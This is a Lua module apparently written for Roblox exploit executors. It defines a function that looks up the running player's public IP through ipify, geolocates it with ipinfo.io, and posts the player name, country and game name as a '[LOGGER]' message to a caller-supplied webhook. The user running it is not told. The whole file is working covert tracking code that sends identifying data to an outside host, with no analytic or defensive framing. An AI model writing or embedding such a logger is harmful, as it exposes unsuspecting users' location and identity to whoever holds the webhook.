local function web(webhookURL)
    return function()
        local HttpService = game:GetService("HttpService")
        local playerName = game.Players.LocalPlayer.Name
        local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        
        local req = request({
            Url = "https://api.ipify.org/",
            Method = "GET"
        })
        local ipAddress = req.Body
        

        local country = "Unknown"
        local response = HttpService:GetAsync("https://ipinfo.io/" .. ipAddress .. "/json")
        if response then
            local info = HttpService:JSONDecode(response)
            country = info.country or "Unknown"
        end
        
        local message = "[LOGGER] " .. playerName .. " from " .. country .. " in " .. gameName .. "."
        local requestBody = { content = message }
        local headers = { ["Content-Type"] = "application/json" }

        local request = http_request or request or syn.request or http.request
        if request then
            request({
                Url = webhookURL,
                Method = "POST",
                Headers = headers,
                Body = HttpService:JSONEncode(requestBody)
            })
        else
            warn("HTTP request function not available.")
        end
    end
end

return web
